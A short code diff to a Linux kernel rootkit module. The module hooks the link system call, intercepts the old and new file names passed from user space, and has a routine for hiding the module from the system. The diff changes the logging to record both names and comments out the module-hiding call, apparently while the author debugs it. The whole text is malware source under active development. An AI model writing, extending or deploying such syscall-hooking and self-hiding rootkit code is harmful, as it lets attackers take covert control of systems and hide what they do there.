@@ -117,6 +117,9 @@ asmlinkage int hook_link(const struct pt_regs *regs) {
   char oldname[NAME_MAX] = {0};
   int oldname_len =
       strncpy_from_user(oldname, (const char *)regs->di, NAME_MAX);
+  char newname[NAME_MAX] = {0};
+    int newname_len =
+        strncpy_from_user(newname, (const char *)regs->si, NAME_MAX);
 
   if (oldname_len == 0) {
     goto done;
@@ -127,10 +130,6 @@ asmlinkage int hook_link(const struct pt_regs *regs) {
       oldname[2] == 'd' && oldname[3] == 'e') {
 
     int i;
-    char newname[NAME_MAX] = {0};
-    int newname_len =
-        strncpy_from_user(newname, (const char *)regs->si, NAME_MAX);
-
     if (newname_len == 0) {
       goto done;
     }
@@ -146,7 +145,7 @@ asmlinkage int hook_link(const struct pt_regs *regs) {
     return 1;
   }
 
-  printk(KERN_INFO "rootkit: link %s\n", oldname);
+  printk(KERN_INFO "rootkit: link %s %s\n", oldname, newname);
 
 done:
   return orig_link(regs);
@@ -169,7 +168,7 @@ void module_hide(void) {
 static int __init rootkit_init(void) {
   int err;
 
-  module_hide();
+//  module_hide();
   err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
   if (err)
     return err;
